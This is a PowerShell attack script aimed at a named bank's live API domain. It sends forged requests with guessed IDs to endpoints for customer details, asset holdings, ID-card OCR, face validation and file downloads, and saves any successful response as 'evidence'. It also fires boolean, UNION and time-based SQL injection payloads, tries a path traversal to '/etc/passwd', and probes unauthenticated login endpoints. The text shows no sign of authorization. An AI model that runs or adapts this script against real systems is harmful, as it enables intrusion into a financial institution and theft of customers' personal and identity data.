$ProgressPreference = "SilentlyContinue"
$ErrorActionPreference = "Continue"

$url = "https://dl.brcloud.bankofchina.com/dlydjd/sgp/transferRequest"
$outDir = "e:\BaiduNetdiskDownload\1\vuln_evidence"
if (-not (Test-Path $outDir)) { New-Item -ItemType Directory -Path $outDir | Out-Null }

function Send-Api {
    param($tranCode, $extraParams, $desc)

    $parts = $tranCode -split '/'
    $apiName = $parts[1]

    $header = @{
        CurrentPageNum = 1
        PageTotalNum = 10
        NoRetCode = $true
        BranchId = "800000"
        LegalRepCode = "10000"
        TranTeller = ""
        TranCode = $tranCode
        TranDate = "20260716"
        TranTime = "004500000"
        ServiceName = $apiName
        ServiceCode = "D20190130"
        AuthFlag = "0"
        AuthrTellerNo = "1"
        Channel = "39"
        ConsumerId = "1"
        GlobalSeq = "1"
        GlobalSeqNo = "1"
        KeyId = "1"
        LocalLang = "1"
        Mac = "1"
        SourceSysId = "1111"
        TerminalCode = "1121"
        TranSeq = "1"
        TranSeqNo = "1"
        TranTellerNo = "1"
        ExtendContent = "1"
        TotalNum = "0"
    }

    $bodyObj = @{ Header = $header }
    if ($extraParams) {
        foreach ($key in $extraParams.Keys) {
            $bodyObj[$key] = $extraParams[$key]
        }
    }

    $body = $bodyObj | ConvertTo-Json -Depth 5 -Compress
    $tempFile = [System.IO.Path]::GetTempFileName()
    [System.IO.File]::WriteAllText($tempFile, $body)

    $startTime = Get-Date
    $resp = (curl.exe -sk --noproxy "*" --max-time 20 -X POST $url -H "Content-Type: application/json" -H "Authorization: 987654321" --data-binary "@$tempFile" -w "`nHTTP_CODE:%{http_code} TIME:%{time_total}s SIZE:%{size_download}" 2>&1) -join "`n"
    $endTime = Get-Date
    $duration = [math]::Round(($endTime - $startTime).TotalSeconds, 2)
    Remove-Item $tempFile -Force

    $retCode = ""
    $retMsg = ""
    if ($resp -match '"RetCode":"([^"]*)"') { $retCode = $Matches[1] }
    if ($resp -match '"RetMsg":"([^"]*)"') { $retMsg = $Matches[1] }

    $status = if ($retCode -eq "000000") { "SUCCESS" } elseif ($retCode) { "ERR:$retCode" } else { "HTTP_ERR" }
    Write-Host "[$desc] $tranCode => $status | RetCode=$retCode RetMsg=$retMsg | Time=${duration}s Size=$($resp.Length)" -ForegroundColor Cyan

    if ($retCode -eq "000000") {
        $preview = if ($resp.Length -gt 500) { $resp.Substring(0, 500) + "..." } else { $resp }
        Write-Host "  >>> SUCCESS! Preview:" -ForegroundColor Green
        Write-Host "  $preview" -ForegroundColor Yellow

        $safeName = ($tranCode + "_" + $desc) -replace "[/\\ ]", "_"
        $respFile = Join-Path $outDir ("deep_${safeName}.json")
        $resp | Out-File -FilePath $respFile -Encoding utf8
        Write-Host "  Saved: $respFile" -ForegroundColor Gray
    }
    Write-Host ""
    Start-Sleep -Milliseconds 300
}

Write-Host "========== Part 1: Sensitive Customer Info APIs ==========" -ForegroundColor Magenta

Send-Api "CUST-INFO/selectPersonCust" @{custNo="1"} "custNo=1"
Send-Api "CUST-INFO/selectPersonCust" @{partyId="1"} "partyId=1"
Send-Api "CUST-INFO/selectPersonCust" @{certNo="110101199001011234"} "certNo"
Send-Api "CUST-INFO/selectPersonCust" @{customerId="1"} "customerId=1"
Send-Api "CUST-INFO/queryCustomerAssetArray" @{custNo="1"} "asset custNo=1"
Send-Api "CUST-INFO/queryCustomerAssetArray" @{partyId="1"} "asset partyId=1"
Send-Api "CUST-INFO/queryPrepaidMerchantBaseInfo" @{merchantId="1"} "merchant=1"
Send-Api "CUST-INFO/queryPrepaidMerchantBaseInfo" @{} "merchant empty"
Send-Api "CUST-INFO/selectCustCertificateList" @{custNo="1"} "certList custNo=1"
Send-Api "CUST-INFO/selectCustCertificateList" @{} "certList empty"
Send-Api "CUST-INFO/findListPartyIdentificationAuth" @{partyId="1"} "auth partyId=1"
Send-Api "CUST-INFO/findListPartyIdentificationAuth" @{} "auth empty"
Send-Api "CUST-INFO/queryCustComponentDetail" @{custNo="1"} "component custNo=1"
Send-Api "CUST-INFO/queryCustComponentDetail" @{} "component empty"
Send-Api "CUST-INFO/userActionAdd" @{actionType="login"; userId="1"} "userAction"

Write-Host "========== Part 2: Order/Identity APIs ==========" -ForegroundColor Magenta

Send-Api "EC-IDEN/queryOrderDetail" @{orderId="1"} "order id=1"
Send-Api "EC-IDEN/queryOrderDetail" @{orderNo="1"} "order no=1"
Send-Api "EC-IDEN/queryOrderDetail" @{} "order empty"
Send-Api "EC-IDEN/getOcrIdCardResult" @{orderId="1"} "ocr id=1"
Send-Api "EC-IDEN/getOcrIdCardResult" @{} "ocr empty"
Send-Api "EC-IDEN/getFaceValidate" @{orderId="1"} "face id=1"
Send-Api "EC-IDEN/getFaceValidate" @{} "face empty"
Send-Api "EC-IDEN/completionOrderInfo" @{orderId="1"} "complete id=1"
Send-Api "EC-IDEN/idcardOCR" @{} "idcard empty"

Write-Host "========== Part 3: File Management APIs ==========" -ForegroundColor Magenta

Send-Api "EC-FILE-MGR/queryFileInfo" @{fileId="1"} "file id=1"
Send-Api "EC-FILE-MGR/queryFileInfo" @{} "file empty"
Send-Api "EC-FILE-MGR/downloadFile" @{fileId="1"} "download id=1"
Send-Api "EC-FILE-MGR/downloadFile" @{fileName="test.pdf"} "download name"
Send-Api "EC-FILE-MGR/uploadFile" @{} "upload empty"
Send-Api "EC-FILE-MGR/queryFileList" @{} "fileList empty"

Write-Host "========== Part 4: Product APIs ==========" -ForegroundColor Magenta

Send-Api "PROD-SOPE/queryProdInfo" @{prodId="1"} "prod id=1"
Send-Api "PROD-SOPE/queryProdInfo" @{} "prod empty"
Send-Api "PROD-SOPE/queryProdList" @{} "prod list"
Send-Api "PROD-SOPE/queryProdList" @{prodType="all"} "prod type=all"

Write-Host "========== Part 5: Other APIs ==========" -ForegroundColor Magenta

Send-Api "AGRE-AGRE/queryListByWorkEffortId" @{workEffortId="1"} "workEffort=1"
Send-Api "AGRE-AGRE/signAgreement" @{templateId="FDC1360001"} "sign"
Send-Api "AGRE-AGRE/formatDocContent" @{content="test"} "format"
Send-Api "CUST-RELA/queryPartyRelationship" @{partyId="1"} "rela partyId=1"
Send-Api "CHANNEL/shareInstProcess" @{} "shareInst empty"
Send-Api "CHANNEL_MANAGE/validateChannel" @{channelId="39"} "channel=39"
Send-Api "CUST-CSER/acCreateCommunicationEventResult" @{} "comm empty"

Write-Host "========== Part 6: SQL Injection Tests ==========" -ForegroundColor Magenta

Send-Api "AGRE-AGRE/getAgreementInfo" @{templateId="FDC1360001' OR '1'='1"} "sqli-bool-true"
Send-Api "AGRE-AGRE/getAgreementInfo" @{templateId="FDC1360001' OR '1'='2"} "sqli-bool-false"
Send-Api "AGRE-AGRE/getAgreementInfo" @{templateId="FDC1360001' UNION SELECT 1,2,3,4,5,6,7,8,9,10-- "} "sqli-union"
Send-Api "AGRE-AGRE/getAgreementInfo" @{templateId="FDC1360001' AND SLEEP(5)-- "} "sqli-time-5s"
Send-Api "AGRE-AGRE/getAgreementInfo" @{templateId="FDC1360001' AND 1=1-- "} "sqli-and-true"
Send-Api "AGRE-AGRE/getAgreementInfo" @{templateId="FDC1360001' AND 1=2-- "} "sqli-and-false"

Send-Api "SSP-AUTH/queryMenuTreeBySysIdRoleIdWithGuest" @{roleId="styy-guest' OR '1'='1"; sysId="M39"} "sqli-role-bool"
Send-Api "SSP-AUTH/queryMenuTreeBySysIdRoleIdWithGuest" @{roleId="styy-guest' UNION SELECT 1,2,3,4,5-- "; sysId="M39"} "sqli-role-union"
Send-Api "SSP-AUTH/queryMenuTreeBySysIdRoleIdWithGuest" @{roleId="styy-guest' AND SLEEP(5)-- "; sysId="M39"} "sqli-role-time"

Write-Host "========== Part 7: Direct File Access ==========" -ForegroundColor Magenta

$directTests = @(
    @{url="https://dl.brcloud.bankofchina.com/dlydjd/sgp/queryFileInfo"; method="POST"; body='{"fileId":"1"}'; desc="queryFileInfo POST"},
    @{url="https://dl.brcloud.bankofchina.com/dlydjd/sgp/updownLoadFile/download"; method="POST"; body='{"fileId":"1"}'; desc="download POST fileId"},
    @{url="https://dl.brcloud.bankofchina.com/dlydjd/sgp/updownLoadFile/download?fileName=../../../etc/passwd"; method="GET"; body=""; desc="download GET traversal"},
    @{url="https://dl.brcloud.bankofchina.com/dlydjd/sgp/updownLoadFile/download?fileId=1"; method="GET"; body=""; desc="download GET fileId"},
    @{url="https://dl.brcloud.bankofchina.com/dlydjd/sgp/updownLoadFile/download?fileName=test.pdf"; method="GET"; body=""; desc="download GET name"},
    @{url="https://dl.brcloud.bankofchina.com/dlydjd/NOSGP/queryFileInfo"; method="POST"; body='{"fileId":"1"}'; desc="NOSGP queryFileInfo"},
    @{url="https://dl.brcloud.bankofchina.com/dlydjd/sgp/upload"; method="POST"; body='{}'; desc="upload POST"},
    @{url="https://dl.brcloud.bankofchina.com/dlydjd/sgp/freeLogin"; method="POST"; body='{}'; desc="freeLogin POST"},
    @{url="https://dl.brcloud.bankofchina.com/dlydjd/NOSGP/freeLogin"; method="POST"; body='{}'; desc="NOSGP freeLogin"},
    @{url="https://dl.brcloud.bankofchina.com/dlydjd/http/queryFileInfo"; method="POST"; body='{"fileId":"1"}'; desc="http queryFileInfo"}
)

foreach ($dt in $directTests) {
    if ($dt.method -eq "GET") {
        $resp = (curl.exe -sk --noproxy "*" --max-time 15 -X GET $dt.url -H "Authorization: 987654321" -w "`nHTTP_CODE:%{http_code} SIZE:%{size_download}" 2>&1) -join "`n"
    } else {
        $resp = (curl.exe -sk --noproxy "*" --max-time 15 -X POST $dt.url -H "Content-Type: application/json" -H "Authorization: 987654321" --data-binary $dt.body -w "`nHTTP_CODE:%{http_code} SIZE:%{size_download}" 2>&1) -join "`n"
    }
    $preview = if ($resp.Length -gt 300) { $resp.Substring(0, 300) + "..." } else { $resp }
    Write-Host "[$($dt.method)] $($dt.url)" -ForegroundColor Cyan
    Write-Host "  => $preview" -ForegroundColor Yellow
    Write-Host ""
    Start-Sleep -Milliseconds 300
}

Write-Host "========== Deep Vulnerability Test Complete ==========" -ForegroundColor Green
